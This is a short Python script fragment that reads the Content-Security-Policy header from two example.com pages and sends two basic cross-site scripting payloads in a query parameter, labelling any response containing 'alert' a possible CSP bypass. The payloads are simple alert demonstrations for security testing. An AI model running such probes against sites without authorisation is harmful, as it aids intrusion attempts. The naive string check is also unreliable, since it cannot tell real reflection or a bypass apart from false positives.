# List of test URLs
urls = ["http://example.com", "http://example.com/page"]

# Payloads to test
payloads = ["<img src=x onerror=alert(1)>", "<script>alert('CSP Bypass')</script>"]

for url in urls:
    # Get CSP headers
    response = requests.get(url)
    csp_header = response.headers.get("Content-Security-Policy", "No CSP Header")
    print(f"CSP for {url}: {csp_header}")

    # Test payloads
    for payload in payloads:
        test_url = f"{url}?input={payload}"
        test_response = requests.get(test_url)
        if "alert" in test_response.text:
            print(f"Potential CSP Bypass Found at {test_url} with payload {payload}")